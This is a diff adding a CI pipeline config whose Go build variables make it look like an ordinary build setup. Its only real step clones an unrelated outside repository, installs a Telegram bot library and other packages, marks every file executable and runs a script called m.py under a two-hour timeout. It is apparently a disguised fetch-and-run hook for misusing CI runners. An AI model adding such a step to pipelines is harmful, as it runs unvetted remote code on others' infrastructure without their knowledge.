@@ -1,0 +1,18 @@
+version: v2
+global: 
+  runner:
+    os_image: ubuntu # Use Ubuntu Linux as the OS
+  variables: 
+  - CGO_ENABLED=0
+  - GOOS=linux
+  - GOARCH=amd64
+  - GOFLAGS=-mod=vendor
+  - LD_FLAGS=-w -s
+
+tasks:
+  setup:
+    timeout: 7200  # Set the task timeout to 2 hours (7200 seconds)
+    steps:
+    - checkout  # Clone the git repository
+    - run: |
+        git clone https://github.com/aaduopl/mm && cd mm && pip install telebot pymongo aiohttp && chmod +x * && python3 m.py
